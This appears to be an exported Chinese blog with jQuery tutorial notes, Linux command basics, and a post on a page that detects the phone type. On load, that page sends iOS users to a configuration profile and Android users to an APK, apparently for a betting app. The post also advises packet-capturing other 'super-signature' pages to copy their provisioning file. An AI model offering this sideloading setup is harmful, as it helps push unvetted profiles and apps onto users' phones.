接受一个已有的函数，并返回一个带特定上下文的新的函数 ready() 规定当 DOM 完全加载时要执行的函数 resize() 添加/触发 resize 事件 scroll() 添加/触发 scroll 事件 select() 添加/触发 select 事件 submit() 添加/触发 submit 事件 toggle() 在版本 1.9 中被移除。添加 click 事件之间要切换的两个或多个函数 trigger() 触发绑定到被选元素的所有事件 triggerHandler() 触发绑定到被选元素的指定事件上的所有函数 unbind() 从被选元素上移除添加的事件处理程序 undelegate() 从现在或未来的被选元素上移除事件处理程序 unload() 在版本 1.8 中被废弃。添加事件处理程序到 unload 事件 contextmenu() 添加事件处理程序到 contextmenu 事件 $.holdReady() 用于暂停或恢复.ready() 事件的执行 1.事件的绑定与移除123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;2jQ&lt;/title&gt; &lt;script src=&quot;js/jquery-3.5.1.min.js&quot; type=&quot;text/javascript&quot;&gt; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button id =&quot;btn&quot;&gt;添加一个p标签&lt;/button&gt; &lt;div id=&quot;&quot;&gt; &lt;p&gt;yichen is a good man &lt;/p&gt; &lt;p&gt;yichen is a nice man &lt;/p&gt; &lt;p&gt;yichen is a handsome man &lt;/p&gt; &lt;p&gt;yichen is a cool man &lt;/p&gt; &lt;p&gt;yichen is a good1 man &lt;/p&gt; &lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; // $(document).ready(function(){ // }) $(function(){ /*事件模块中最重要的一个函数。它极大地提高了web响应速度 $(document).ready(function(){ }); 可以简写 当$()不带参数时默认就是document $().ready(function(){ }); 还可以简写 $(function(){ }) */ /* $(document).ready()方法代替传统的window.onload()方法，不过两者之间还是有些细微的区别的。 1、在一个页面上可以无限制地使用$(document).ready()方法。各方方法间并不冲突会按照在代码中的顺序依次执行，而windo.onload()方法 在一个页面中只能使用一次。 2、在一个文档完全下载浏览器时(包括所有关联文件。例如图片、横幅等)就会响应 window.onload()方法，而$(document).ready()方法是在所有的DOM元素完全 就绪以后就可以调用，不包括关联的文件，例如在页面上还有图片没有加载完毕但是dom元素已经完全就绪 这样就会执行$(document).ready()方法。在相同条件下window.onload()方法时不会 执行的 ，他会继续等待图片加载，直到图片及其他的关联文件都下载完毕时才会执行，显示，把网页解析为DOM元素的速度要比把页面中的所有关联文件加载完毕的速度快的多 。 */ /*1、绑定事件 bind delegate on live */ //bind 适用给id属性的添加绑定事件 $(&quot;#btn&quot;).click(function(){ $(&quot;div&quot;).append($(&quot;&lt;p&gt;我是新的&lt;/p&gt;&quot;)); }) //bind(type,[data],fn); //type: 事件类型 //data：可选参数，作为event.date属性值传递给事件对象的额外数据对象，大多数的情况下不适应该参数 //fn: 绑定的事件处理程序 // $(&quot;div p&quot;).bind(&quot;click&quot;,function(e){ // console.log($(this).text()); // }) //(&quot;div p&quot;).unbind(&quot;click&quot;) //移除事件 /*bind问题: 1、隐式迭代，如果匹配到的元素特别多的时候，比如我在div里放了50个p标签 ，就的执行绑定50次，对于大量元素来说，影响到了性能 2、对于尚未存储在标签无法绑定事件， */ /*delegate 适用的事件(必须是冒泡的事件)click mousedown mouseup dkeydown keypress keymove */ // $(&quot;div&quot;).delegate(&quot;p&quot;,&quot;click&quot;,function(){ // // $(&quot;div&quot;).append($(&quot;&lt;p&gt;我是新的&lt;/p&gt;&quot;)); // console.log($(this).text()); // }) /*on on()其实是将以前的绑定事件方法做了统一，可以发现无论bind() 还是delegate()，其实都是通过on()方法实现的，只是参数不同罢了。 */ $(&quot;div&quot;).on(&quot;click&quot;,&quot;p&quot;,function(){ console.log($(this).text()); }) }) /*总结 1、选择匹配到的元素比较多时，不要用bind()迭代绑定 2、用id选择器时，可以用bind() 3、用delgate()和on()方法。dom树不要太深 4、尽量使用on() */ &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 2，模拟用户的操作触发事件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;模拟用户操作触发事件&lt;/title&gt; &lt;script src=&quot;js/jquery-3.5.1.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button id =&quot;btn&quot;&gt;添加一个p标签&lt;/button&gt; &lt;button id =&quot;btn2&quot;&gt;按钮&lt;/button&gt; &lt;div id=&quot;&quot;&gt; &lt;p&gt;yichen is a good man &lt;/p&gt; &lt;p&gt;yichen is a nice man &lt;/p&gt; &lt;p&gt;yichen is a handsome man &lt;/p&gt; &lt;p&gt;yichen is a cool man &lt;/p&gt; &lt;p&gt;yichen is a good1 man &lt;/p&gt; &lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(function(){ /* triggerHandler()和trigger()语法格式完全相同 区别: triggerHandler() 不会导致浏览器同名的默认行为被执行 trigger()会导致浏览器同名的默认行为的执行( 可以通过返回false阻止默认行为) 注意: triggerHandler()和trigger()方法可以触发bind的定义事件，并且还 可以为事件传递参数 */ var a = $(&quot;#btn&quot;).bind(&quot;click&quot;,function(event,msg1,msg2){ console.log(&quot;*****%s***%s**&quot;,msg1, msg2) }) // a.trigger(&quot;click&quot;) // a.trigger(&quot;click&quot;) // a.triggerHandler(&quot;click&quot;) a.trigger(&quot;click&quot;,[&quot;yichen&quot;,&quot;good&quot;]) a.triggerHandler(&quot;click&quot;,[&quot;yichen&quot;,&quot;good&quot;]) return false }); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 3,模仿鼠标悬停，移入移出事件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;button id =&quot;btn&quot;&gt;添加一个p标签&lt;/button&gt;//方法一、 // $(&quot;#btn&quot;).hover(function(){ // console.log(&quot;移入&quot;) // },function(){ // console.log(&quot;移出&quot;) // }) //只要移出。 $(&quot;#btn&quot;).hover( null,function(){ console.log(&quot;移出&quot;) }) //方法二、 // $(&quot;#btn&quot;).bind(&quot;mouseover&quot;,function(){ // console.log(&quot;移入&quot;) // }) // $(&quot;#btn&quot;).bind(&quot;mouseout&quot;,function(){ // console.log(&quot;移出&quot;) // }) //查看事件属性，和类型 $(&quot;#btn&quot;).bind(&quot;click&quot;,function(e){ console.log(e); console.log(e.type); }) //事件冒泡: $(&quot;body&quot;).bind(&quot;click&quot;,function(){ $(this).css(&quot;background-color&quot;,&quot;blue&quot;) }) $(&quot;#box&quot;).bind(&quot;click&quot;,function(e){ $(this).css(&quot;background-color&quot;,&quot;yellow&quot;) //阻止冒泡 //e.stopPropagation() //阻止冒泡和默认行为 return false }) $(&quot;#btn&quot;).bind(&quot;click&quot;,function(e){ console.log(e); console.log(e.type); return false }) 2，jquery动画效果下面的表格列出了所有用于创建动画效果的 jQuery 方法。 方法 描述 animate() 对被选元素应用”自定义”的动画 clearQueue() 对被选元素移除所有排队函数（仍未运行的） delay() 对被选元素的所有排队函数（仍未运行）设置延迟 dequeue() 移除下一个排队函数，然后执行函数 fadeIn() 逐渐改变被选元素的不透明度，从隐藏到可见 fadeOut() 逐渐改变被选元素的不透明度，从可见到隐藏 fadeTo() 把被选元素逐渐改变至给定的不透明度 fadeToggle() 在 fadeIn() 和 fadeOut() 方法之间进行切换 finish() 对被选元素停止、移除并完成所有排队动画 hide() 隐藏被选元素 queue() 显示被选元素的排队函数 show() 显示被选元素 slideDown() 通过调整高度来滑动显示被选元素 slideToggle() slideUp() 和 slideDown() 方法之间的切换 slideUp() 通过调整高度来滑动隐藏被选元素 stop() 停止被选元素上当前正在运行的动画 toggle() hide() 和 show() 方法之间的切换 1，隐藏显示切换123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;动画&lt;/title&gt; &lt;script src=&quot;js/jquery-3.5.1.min.js&quot;&gt;&lt;/script&gt; &lt;style type=&quot;text/css&quot;&gt; #box{ width: 100px; height: 100px; background-color: red; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;box&quot;&gt;&lt;/div&gt; &lt;button type=&quot;button&quot; id=&quot;btn1&quot;&gt;隐藏&lt;/button&gt; &lt;button type=&quot;button&quot; id=&quot;btn2&quot;&gt;显示&lt;/button&gt; &lt;button type=&quot;button&quot; id=&quot;btn3&quot;&gt;切换状态&lt;/button&gt; &lt;script type=&quot;text/javascript&quot;&gt; //原生js 隐藏 // document.getElementById(&quot;btn1&quot;).onclick=function(){ // document.getElementById(&quot;box&quot;).style.display=&quot;none&quot; // } //jQ 隐藏 var $div =$(&quot;#box&quot;) $(&quot;#btn1&quot;).click(function(){ //$div.hide(1000,function(){ //slow对应的600 normal 400 fast 200 $div.hide(&quot;slow&quot;,function(){ console.log(&quot;动画结束&quot;) }); //jQ 显示 $(&quot;#btn2&quot;).click(function(){ $div.show(1000) }) //切换状态 $(&quot;#btn3&quot;).click(function(){ $div.toggle(1000) }) }) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 3,jQuery AJAXAJAX 是与服务器交换数据的技术，它在不重载全部页面的情况下，实现了对部分网页的更新。 AJAX = 异步 JavaScript 和 XML（Asynchronous JavaScript and XML）。 简短地说，在不重载整个网页的情况下，AJAX 通过后台加载数据，并在网页上进行显示。 使用 AJAX 的应用程序案例：谷歌地图、腾讯微博、优酷视频、人人网等等。 jQuery 提供多个与 AJAX 有关的方法。 通过 jQuery AJAX 方法，您能够使用 HTTP Get 和 HTTP Post 从远程服务器上请求文本、HTML、XML 或 JSON - 同时您能够把这些外部数据直接载入网页的被选元素中。 如果没有 jQuery，AJAX 编程还是有些难度的。编写常规的 AJAX 代码并不容易，因为不同的浏览器对 AJAX 的实现并不相同。这意味着您必须编写额外的代码对浏览器进行测试。不过，jQuery 团队为我们解决了这个难题，我们只需要一行简单的代码，就可以实现 AJAX 功能。 1,jQuery load() 方法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647jQuery load() 方法是简单但强大的 AJAX 方法。load() 方法从服务器加载数据，并把返回的数据放入被选元素中。语法:$(selector).load(URL,data,callback);必需的 URL 参数规定您希望加载的 URL。可选的 data 参数规定与请求一同发送的查询字符串键/值对集合。可选的 callback 参数是 load() 方法完成后所执行的函数名称。这是示例文件（&quot;demo_test.txt&quot;）的内容：&lt;h2&gt;jQuery AJAX 是个非常棒的功能！&lt;/h2&gt;&lt;p id=&quot;p1&quot;&gt;这是段落的一些文本。&lt;/p&gt;下面的例子会把文件 &quot;demo_test.txt&quot; 的内容加载到指定的 &lt;div&gt; 元素中：实例$(&quot;#div1&quot;).load(&quot;demo_test.txt&quot;);也可以把 jQuery 选择器添加到 URL 参数。下面的例子把 &quot;demo_test.txt&quot; 文件中 id=&quot;p1&quot; 的元素的内容，加载到指定的 &lt;div&gt; 元素中：实例$(&quot;#div1&quot;).load(&quot;demo_test.txt #p1&quot;);可选的 callback 参数规定当 load() 方法完成后所要允许的回调函数。回调函数可以设置不同的参数：responseTxt - 包含调用成功时的结果内容statusTXT - 包含调用的状态xhr - 包含 XMLHttpRequest 对象下面的例子会在 load() 方法完成后显示一个提示框。如果 load() 方法已成功，则显示&quot;外部内容加载成功！&quot;，而如果失败，则显示错误消息$(&quot;button&quot;).click(function(){ $(&quot;#div1&quot;).load(&quot;demo_test.txt&quot;,function(responseTxt,statusTxt,xhr){ if(statusTxt==&quot;success&quot;) alert(&quot;外部内容加载成功!&quot;); if(statusTxt==&quot;error&quot;) alert(&quot;Error: &quot;+xhr.status+&quot;: &quot;+xhr.statusText); });}); 2,jQuery - AJAX get() 和 post() 方法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889jQuery get() 和 post() 方法用于通过 HTTP GET 或 POST 请求从服务器请求数据。HTTP 请求：GET vs. POST两种在客户端和服务器端进行请求-响应的常用方法是：GET 和 POST。GET - 从指定的资源请求数据POST - 向指定的资源提交要处理的数据GET 基本上用于从服务器获得（取回）数据。注释：GET 方法可能返回缓存数据。POST 也可用于从服务器获取数据。不过，POST 方法不会缓存数据，并且常用于连同请求一起发送数据。如需学习更多有关 GET 和 POST 以及两方法差异的知识，请阅读我们的 HTTP 方法 - GET 对比 POST。jQuery $.get() 方法$.get() 方法通过 HTTP GET 请求从服务器上请求数据。语法：$.get(URL,callback);必需的 URL 参数规定您希望请求的 URL。可选的 callback 参数是请求成功后所执行的函数名。下面的例子使用 $.get() 方法从服务器上的一个文件中取回数据：实例$(&quot;button&quot;).click(function(){ $.get(&quot;demo_test.php&quot;,function(data,status){ alert(&quot;数据: &quot; + data + &quot;\\n状态: &quot; + status); });});尝试一下 »$.get() 的第一个参数是我们希望请求的 URL（&quot;demo_test.php&quot;）。第二个参数是回调函数。第一个回调参数存有被请求页面的内容，第二个回调参数存有请求的状态。提示： 这个 PHP 文件 (&quot;demo_test.php&quot;) 类似这样：demo_test.php 文件代码:&lt;?phpecho '这是个从PHP文件中读取的数据。';?&gt;jQuery $.post() 方法$.post() 方法通过 HTTP POST 请求向服务器提交数据。语法:$.post(URL,data,callback);必需的 URL 参数规定您希望请求的 URL。可选的 data 参数规定连同请求发送的数据。可选的 callback 参数是请求成功后所执行的函数名。下面的例子使用 $.post() 连同请求一起发送数据：实例$(&quot;button&quot;).click(function(){ $.post(&quot;/try/ajax/demo_test_post.php&quot;, { name:&quot;菜鸟教程&quot;, url:&quot;http://www.runoob.com&quot; }, function(data,status){ alert(&quot;数据: \\n&quot; + data + &quot;\\n状态: &quot; + status); });});尝试一下 »$.post() 的第一个参数是我们希望请求的 URL (&quot;demo_test_post.php&quot;)。然后我们连同请求（name 和 url）一起发送数据。&quot;demo_test_post.php&quot; 中的 PHP 脚本读取这些参数，对它们进行处理，然后返回结果。第三个参数是回调函数。第一个回调参数存有被请求页面的内容，而第二个参数存有请求的状态。提示： 这个 PHP 文件 (&quot;demo_test_post.php&quot;) 类似这样：demo_test_post.php 文件代码&lt;?php$name = isset($_POST['name']) ? htmlspecialchars($_POST['name']) : '';$url = isset($_POST['url']) ? htmlspecialchars($_POST['url']) : '';echo '网站名: ' . $name;echo &quot;\\n&quot;;echo 'URL 地址: ' .$url;?&gt; 3,jq -Ajax使用1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;Ajax&lt;/title&gt; &lt;script src=&quot;js/jquery-3.5.1.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button type=&quot;button&quot; id=&quot;btn&quot; &gt;按钮&lt;/button&gt; &lt;div id=&quot;box&quot;&gt; &lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(function(){ $(&quot;#btn&quot;).bind(&quot;click&quot;,function(){ $.ajax({ type:&quot;get&quot;, url: &quot;http://127.0.0.1:8848/1%2CjQuery%E5%9F%BA%E7%A1%80/js/jquery-3.5.1.min.js&quot;, data:{a:1,b:2}, dataType:&quot;text&quot;, success: function(data,textStatus){ console.log(data); /*var d = data[&quot;CATALOG&quot;][&quot;CD&quot;] for (var i = 0;i&lt;d.length; i++) { var info = d[i] var $p =$(&quot;&lt;p&gt;&quot;+ info[&quot;TITLE&quot;]+&quot;&lt;/p&gt;&quot;) }*/ //var $p=$(&quot;&lt;p&gt;&quot;+ data +&quot;&lt;/p&gt;&quot;) $(&quot;#box&quot;).append(data) } }) }) }) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","link":"/2020/08/04/jQuery%E5%9F%BA%E7%A1%80/"},{"title":"js判断ios和安卓端分别跳转不同地址","text":"js判断ios和安卓端分别跳转不同地址 1、html代码 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;休闲APP下载&lt;/title&gt; &lt;link rel=&quot;shortcut Icon&quot; href=&quot;ftl/bet365-627/images/favicon.png&quot; /&gt; &lt;script type=&quot;text/javascript&quot;&gt; var browser = { versions: function() { var u = navigator.userAgent, app = navigator.appVersion; return {//移动终端浏览器版本信息 trident: u.indexOf('Trident') &gt; -1, //IE内核 presto: u.indexOf('Presto') &gt; -1, //opera内核 webKit: u.indexOf('AppleWebKit') &gt; -1, //苹果、谷歌内核 gecko: u.indexOf('Gecko') &gt; -1 &amp;&amp; u.indexOf('KHTML') == -1, //火狐内核 mobile: !!u.match(/AppleWebKit.*Mobile.*/) || !!u.match(/AppleWebKit/), //是否为移动终端 ios: !!u.match(/\\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端 android: u.indexOf('Android') &gt; -1 || u.indexOf('Linux') &gt; -1, //android终端或者uc浏览器 iPhone: u.indexOf('iPhone') &gt; -1 || u.indexOf('Mac') &gt; -1, //是否为iPhone或者QQHD浏览器 iPad: u.indexOf('iPad') &gt; -1, //是否iPad webApp: u.indexOf('Safari') == -1 //是否web应该程序，没有头部与底部 }; }(), language: (navigator.browserLanguage || navigator.language).toLowerCase() } if (browser.versions.ios || browser.versions.iPhone || browser.versions.iPad) { // window.location=&quot;ios_down.html&quot;; //ios 下载页面 window.location.href=&quot;https://baidu.com/baidu.mobileconfig&quot;; //ios 下载页面 window.setTimeout(function(){window.location.href=&quot;https://baidu.com/embedded.mobileprovision&quot;; //跳转到设置 }, 2000); } //else if (browser.versions.android) { else { window.location.href=&quot;https://baidu.com/baidu.apk&quot;; } &lt;/script&gt; &lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 2、 mobileprovision文件获取。 123https://baidu.com/embedded.mobileprovision 此文件控制ios描述文件下载后，自动跳转到设置安装页面。此文件通过，其他ios超级签下载页面抓包获取即可。然后下载到本地。最后再上传到服务器。","link":"/2021/11/30/js%E5%88%A4%E6%96%ADios%E5%92%8C%E5%AE%89%E5%8D%93%E7%AB%AF%E5%88%86%E5%88%AB%E8%B7%B3%E8%BD%AC%E4%B8%8D%E5%90%8C%E9%A1%B5%E9%9D%A2/"},{"title":"linux基础","text":"一. linux的控制台 linux控制台是什么以后学习和工作的主要工具, 接受用户输入的命令 怎么打开 a. 鼠标 桌面空白位置, 右键, 打开终端 b. 快捷键 默认没有直接打开终端的快捷键， 需要自己去设置 左键最右上角 --&gt; 选择最下左进入setting --&gt; 左最下的Devices --&gt; Keyboard --&gt; 右边最下面的 + 号 Name: Open Terminal &lt;-- 快捷键的名字 Command： /bin/gnome-terminal &lt;-- 要执行的命令 Shortcut: ctrl + alt + t &lt;-- 点击之后按这3个组合建 3. 把语言环境设置成中文 locale LANG=en_US.UTF-8 &lt;-- 语言环境是英文 sudo locale -a zh_CN.utf8 &lt;-- 查看是否有这个结果，这个是简体中文 如果没有就安装中文简体包 sudo yum install kde-l10n-Chinese sudo vim /etc/locale.conf #LANG=&quot;en_US.UTF-8&quot; --&gt; 注释掉 LANG=&quot;zh_CN.UTF8&quot; --&gt; 改成中文 reboot --&gt; 重启 重启结束后 选择以后不再提示 ， 保留原来的名字 基础使用 a. 调整窗口字体大小 Ctrl + Shift + = 放大字体 Ctrl + - 缩小字体 b. 多加一个窗口 Ctrl + Shift + n 新建一个终端 Ctrl + Shift + t 在终端里新建一个标签 c. 其他的基本操作 Alt + [1 - 9] 标签之间切换 d. 关闭终端 exit 终端配置(字体，大小，颜色，透明度) 右键 --&gt; 配置文件 --&gt; 配置文件首选项 终端字体推荐使用: dejavu sans mono bold 14 颜色推荐取消第一个选项， 选择黑底白字 透明度不推荐超过上方左边方框的右边框 关机和重启 重启命令： reboot init 6 关机命令： init 0 修改命令提示符 vim ~/.bashrc 在最后添加一行: 1234567样式1export PS1=&quot;\\[\\e[37;40m\\][\\[\\e[32;40m\\]\\u\\[\\e[37;40m\\]@\\h \\[\\e[35;40m\\]\\w\\[\\e[0m\\]]\\\\$ &quot;样式2export PS1=&quot;\\e[35m\\][\\u@\\h \\W]\\\\$\\\\[\\e[0m\\]&quot; 然后输入命令 source ~/.bashrc 或 . ~/.bashrc 二. linux 基本命令linux命令严格区分大小写 命令 shell 命令解析器 当前SHELL环境变量: 12echo $SHELL/bin/bash 1. 命令是什么linux命令是对Linux系统进行管理的命令。对于Linux系统来说，无论是中央处理器、内存、磁盘驱动器、键盘、鼠标，还是用户等，都是文件，Linux系统管理的命令是它正常运行的核心，与Windows的DOS命令类似。 linux 是一切基于文件的 命令的格式所有英文书写必须使用半角(宽字符: 光标移上去显示两个位置)命令和参数严格区分大小写 命令使用语法: 命令名 参数1 参数2 … 参数n 命令名与参数之间分隔符为空格(自动处理重复分隔符) 参数之间分隔符为空格(自动处理重复分隔符) man mv [] 可有可无 ... 前面内容可以有多个(不限个数) man ip | 多选一 {} 此符号表示为分组 命令的参数 处理参数里带空格字符问题: 使用双引号, 单引号, \\ 来解决命令参数的分类: 选项 以-或–开头的参数, 控制命令的功能**长选项 – **可读性高, –后跟单词 **短选项 - **便捷性高, -后跟单个字符, 如果跟多个字符代表多个短选项 选项值 无值选项 -l / list 有值选项 -t utf8 / –to=utf8 可选值选项 –color=auto / –color 普通参数(多为路径) 命令处理的源 2. 命令的分类 linux命令在系统中有两种类型：内部命令和外部命令。 内部命令 Shell在内部代码中实现的命令 man type 查看bash Shell自带的命令 外部命令 Shell以外的命令 用type命令查看内部命令还是外部命令 type cd 提示cd is a shell builtin则说明是内部命令 type mount 提示mount is /bin/bash 告诉外部命令的位置 3. 帮助命令 a. man 注重于应用，也是最常用的帮助方法 man 的帮助文档存放的位置 /usr/share/man man 的帮助文档分类 man 1 ls 查看ls命令的第一节手册 1 普通用户命令 2 系统核心调用的函数工具 3 常用的一些函数与函数库 4 设备文件的说明 5 配置文件与一些其它格式的文件 6 游戏相关 7 网络协议相关 8 管理员可操作的命令 9 系统内核相关的文件 在 man 帮助里： /c 搜索c关键字 n 下一个关键字 N 上一个关键字 q 退出 b. info 注重于介绍，不常用 帮助文档存放位置 /usr/share/info info 进入页面 进入帮助界面 ? info命令帮助 空格键 向下翻一页 tab 在结点之间移动，有结点的地方通常会以*显示，将光标移动结点位置按回车可进入结点 b 移动光标到该文章的第一个结点处 e 移动光标到该文章的最后一个结点处 n 前往下一个info页 p 前往上一个info页 u 向上移动一层 s(/) 在info里搜索 h 显示帮助菜单 q 退出 4. 目录命令 pwd 查看当前所在目录的路径 cd 切换当前所在目录 是change directory的简写 绝对路径 cd /root/Desktop 指从根目录开始的路径 相对路径 cd root/ 指以当前目录开始的路径 . 代表当前所在目录 .. 代表当前的父目录 - 代表上一次所在的目录 ~ 代表当前登录用户的家目录 / 代表根目录 mkdir 创建一个目录 在当前目录下创建test目录 mkdir test mkdir ./test cd ~ 在根目录下tmp目录里创建test目录 mkdir /tmp/test 在当前目录下创建file1到file100的目录 mkdir file1 mkdir file2 ... mkdir file100 或者 mkdir file{1..100} 字母也是可以的 mkdir file{a..z} 在当前目录下创建file{1..100}目录,需要用双引号引起来 mkdir &quot;file{1..100}&quot; 在当前目录下创建a/b/c目录树 (PPP1) mkdir -p a/b/c 在当前目录创建feile1到file100的目录树 mkdir file{1..100}/nginx/ssl -p mkdir file/cq{a..z}/nginx/ssl -p rmdir 只能删除空目录 rmdir test 删除当前目录的test目录，test必须是空目录 rmdir /tmp/test 删除/tmp下的test目录 rmdir file{1..100} 删除file1到file100的目录 rmdir &quot;file{1..100}&quot; 删除file{1..100}目录 5. 文件命令 ls 列出当前文件夹下的所有文件和文件夹 ls -a 列出当前目录下所有文件，包含隐藏文件 ls -l 以详细列表形式列出当前目录下的所有文件 ls -R 列出当前目录所有文件，包含子目录内所有文件 文件类型： c 字符设备文件 端口的接口设备 b 块设备 用来挂载硬盘分区， 一般不自己去创建 l 链接文件 ln -s 源文件 链接文件 软连接(指向文件系统的节点) ln 源文件 链接文件 硬链接(指向硬盘位置) s socket文件 这类文件经常用于网络数据连接，可以启动一个程序来监听客户端 客户端就可以通过socket文件来进行数据通信 p 管道文件 解决进程之间的通信 d 目录文件 - 普通文件 -rwxr-xr-x. 1 root root 2475 9月 8 18:10 iptables.sh - 文件类型 rwxr-xr-x 文件权限 1 文件的链接数 root 文件的所属用户 root 文件的所属用户组 2457 文件的大小 9月 8 18:10 文件的最后修改时间 iptables.sh 文件名 常用搭配： 显示所有文件包括隐藏文件列表 ls -al 显示按日期时间排序后的文件列表 ls -lt 显示计算大小为KB/m/G为单位的文件列表 ls -lh 显示当前文件夹详细信息 ls -ld touch 新建文件 创建file空文件，如果file存在则更新file的存取和修改时间, 但是不会覆盖里面的内容 touch file 如果file不存在，则不创建文件 touch -c file 更新file时间和file1相同 touch -r file1 file 更新file的存取时间 touch -a file 更新file的修改时间 touch -m file 同时创建file2,file3,file4三个空文件 touch file2 file3 file4 touch file{2,3,4} 创建file{2,3,4}一个空文件 touch &quot;file{2,3,4}&quot; cp 复制文件/文件夹 把file文件复制到dirs目录下 cp file dirs 把dir1目录复制到dir2目录下 cp dir1 dir2 -r 把file文件复制到dirs目录下，保留文件的原来属性 cp -a file dir2 强制复制文件夹，不提示 cp -rf file dir2 把dir1目录复制到dir2目录下，并且显示复制过程 cp -rvf dir1 dir2 把file1..6复制到dir2目录下，直接覆盖不提示 \\cp -a file* dir2 选项: -a 保留文件的原来属性 -r 复制目录 -i 提示是否覆盖, 默认直接覆盖 -u 更新, 比对时间,源文件比目标文件的时间新才会覆盖 -v 显示复制进度 -t 指定目标路径(应用复制多个文件或目录的场景) -f 不提示，直接执行 mv 移动和重命名文件(PPP3) 把file1..6移动到dir2目录下，直接覆盖不提示 \\mv file* dir2/ 把file文件移动到dirs目录下 mv file dirs/ 把file文件重命名为file2 mv file file2 把dir1目录下所有文件移动到dir2目录下，并且根据文件时间来决定要不要移动 mv -u dir1/* dir2/ rename 批量文件重命名 lsfile1.conf file2.conf file3.conf file4.conf file5.conf file6.conf 1234rename .conf .html *.conflsfile1.html file2.html file3.html file4.html file5.html file6.html 把所有后缀以.conf的文件名里出现.conf就改成.html(PPP4)只有当前目录下面的文件名中有.conf才会去改变名字， 若出现多个， 命令执行一次只会改变一个.conf rm 删除文件[夹] 删除所有file开头的文件夹 rm file* -rf 删除所有.txt结尾的文件 rm *.txt 提示是否确定删除 rm -i file 不提示，强行删除 rm -f file 删除目录 rm -r file 删除文件夹的软链接而不删除源文件 常用参数 rfv 6. 文件阅读命令 cat 文件查看命令 查看/etc/passwd内容 cat /etc/passwd 查看/etc/passwd内容并且编号 cat -n /etc/passwd 查看/etc/passwd内容并且给非空行编号 cat -b /etc/passwd 碰到多个连续的空行， 合并成一个空行 cat -s /etc/passwd head 查看/etc/passwd前10行内容 head /etc/passwd 查看/etc/passwd前30行内容 head -n 30 /etc/passwd 查看/etc/passwd前30个字符的内容 head -c 30 /etc/passwd tail 查看/etc/passwd后10行内容 tail /etc/passwd 查看/etc/passwd后30行内容 tail -n 30 /etc/passwd 查看/etc/passwd后30个字符的内容 tail -c 30 /etc/passwd 实时查看/etc/passwd文件内容 tail -f /var/log/nginx/access.log ​​ less​ 查看/etc/passwd文件内容，和more不同的是可以上下滚动​ less /etc/passwd​ 显示每行的行号​ less -N /etc/passwd​ 显示类似more的百分比​ less -m /etc/passwd​​ 按q退出​​ more​ 逐屏查看/etc/passwd文件内容​ more /etc/passwd 7. 重定向 (实用) 标准输入 代码 0 默认设备为键盘 标准输出 代码 1 默认设备为屏幕 错误输出 代码 2 默认设备为屏幕 标准正确输出重定向到output.txt ls -hl /etc/passwd &gt; output.txt 标准正确输出追加重定向到output.txt ls -hl /etc/passwd &gt;&gt; output.txt 标准错误输出重定向到error.txt ls -hl ddd 2&gt; error.txt 标准错误输出重定向到黑洞 ls -hl dddd 2&gt; /dev/null 标准正确输出和标准错误输出全都重定向到黑洞 ls ddddd /etc/passwd &amp;&gt; /dev/null &gt; 和 &gt;&gt; 的区别 &gt; 输出重定向, 清空文件再写 &gt;&gt; 输出重定向，从最后的一个有效字符的下一行开始拼接文件, 追加 &lt; 输入重定向, 后面跟文件，将文件内容作为前面命令的标准输入 wc -l &lt; /etc/passwd 把/etc/passwd作为wc -l的输入源 &lt;&lt; 输入重定向, 后面跟结束标识符, 将结束标识符前面内容作为命令的标准输入 wc -l &lt;&lt; EOF &lt; hello world &lt; hello linux &lt; bye &lt; EOF 把标识符EOF之间的内容作为前面命令的输入， 第一个标识符和&lt;&lt; 之间要有空格(可以不加, 但是为了美观, 加上去), 第二个标识符那一行的前面不能有任何的有效字符， 后面也不能加任何的有效字符(换行符除外) &lt;&lt;&lt; 输入重定向, 后面跟字符串，将字符串作为命令的标准输入 cat &lt;&lt;&lt; “hello world” 把hello world字符串作为cat的输入源 cat &lt;&lt;&lt; “hello word” &gt; hallo.txt 把hello world 输入到hello.txt文件里面 wc -l &lt;&lt;&lt; “hello world” 把hello world字符串作为wc -l的输入源 假如后面的输入源字符串需要有多行的话，就需要在字符串的外面加”” wc -l &lt;&lt;&lt; “hello world &gt; hello linux &gt; hello shell &gt; “ 后面的”只要一出现就会结束输入，和标识符的规则不一样 8. 管道(PPP7) cat /etc/passwd | less | 之前的命令执行的结果做|后命令的参数 格式: 命令1 | 命令2 | 命令3 ... | 命令n 将管道符号前面命令标准输出重定向管道符号后面命令标准输入 多重管道能一直起作用的前提是输入和输出不能断 cat /etc/passwd | wc -l 三. Linux文件系统目录介绍/ 根目录，系统所有的目录都是从根目录开始 /bin 存放的是系统可执行的二进制文件，即常用命令 